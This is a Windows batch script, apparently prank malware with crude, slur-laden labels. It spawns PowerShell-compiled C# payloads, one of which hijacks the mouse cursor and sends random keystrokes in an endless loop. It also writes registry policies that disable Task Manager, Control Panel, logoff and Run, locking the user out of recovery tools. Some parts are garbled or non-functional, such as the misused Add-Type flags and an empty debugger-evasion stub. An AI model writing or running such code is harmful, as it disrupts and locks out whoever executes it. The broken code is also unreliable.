@echo off

:ResolutionFucker
:ChocoFace
:ChocolateScreen
:DVDCursorRapist
:DebuggerEvasion
:PolicyRapist

goto ResolutionFucker

:ResolutionFucker
for /F "tokens=2 delims=:" %%a in ('wmic path Win32_VideoController get CurrentHorizontalResolution^,CurrentVerticalResolution^|findstr /r "."') do (
    mode %%a,%%a
    timeout /t 1
)
goto ChocoFace

:ChocoFace
powershell -command "& {Add-Type -TypeDefinition $'
using System;
using System.Drawing;
using System.Windows.Forms;
public class ChocoFace
{
    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Form form = new Form();
        PictureBox pictureBox = new PictureBox();
        pictureBox.Image = Image.FromFile(\"choco_face.jpg\");
        pictureBox.SizeMode = PictureBoxSizeMode.AutoSize;
        form.Controls.Add(pictureBox);
        Application.Run(form);
    }
}
' -ReferencedAssemblies 'System.Drawing.dll' -OutFile 'ChocoFace.exe'}"

:ChocolateScreen
powershell -command "& {
    Add-Type -TypeDefinition $'
    using System;
    using System.Drawing;
    using System.Windows.Forms;
    public class ChocolateScreen
    {
        [STAThread]
        public static void Main()
        {
            using (Bitmap screen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(screen))
                {
                    for (int x = 0; x < screen.Width; x++)
                    {
                        for (int y = 0; y < screen.Height; y++)
                        {
                            Color originalColor = screen.GetPixel(x, y);
                            int blendedRed = (originalColor.R + 139) / 2;
                            int blendedGreen = (originalColor.G + 69) / 2;
                            int blendedBlue = (originalColor.B + 19) / 2;
                            Color blendedColor = Color.FromArgb(blendedRed, blendedGreen, blendedBlue);
                            screen.SetPixel(x, y, blendedColor);
                        }
                    }
                }
                screen.Save(\"chocolate_screen.jpg\");
            }
        }
    }
    ' -ReferencedAssemblies 'System.Drawing.dll' -OutFile 'ChocolateScreen.exe'}"

:DVDCursorRapist
powershell -command "& {Add-Type -TypeDefinition $'
using System;
using System.Drawing;
using System.Windows.Forms;
public class DVDCursorRapist
{
    [STAThread]
    public static void Main()
    {
        Random rand = new Random();
        while (true)
        {
            int x = rand.Next(Screen.PrimaryScreen.Bounds.Width);
            int y = rand.Next(Screen.PrimaryScreen.Bounds.Height);
            Cursor.Position = new Point(x, y);
            SendKeys.SendWait(\"{%}\".Replace(\"%\", ((char)rand.Next(65, 91))).ToString());
            System.Threading.Thread.Sleep(100);
        }
    }
}
' -ReferencedAssemblies 'System.Windows.Forms.dll' -OutFile 'DVDCursorRapist.exe'}"

:DebuggerEvasion
REM Debugger Evasion code goes here

:PolicyRapist
powershell -command "& {
    $policies = @{
        'DisableTaskMgr' = 1;
        'NoControlPanel' = 1;
        'NoLogoff' = 1;
        'NoClose' = 1;
        'NoRun' = 1;
    }
    foreach ($policy in $policies.Keys)
    {
        Set-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" -Name $policy -Value $policies[$policy]
    }
}"
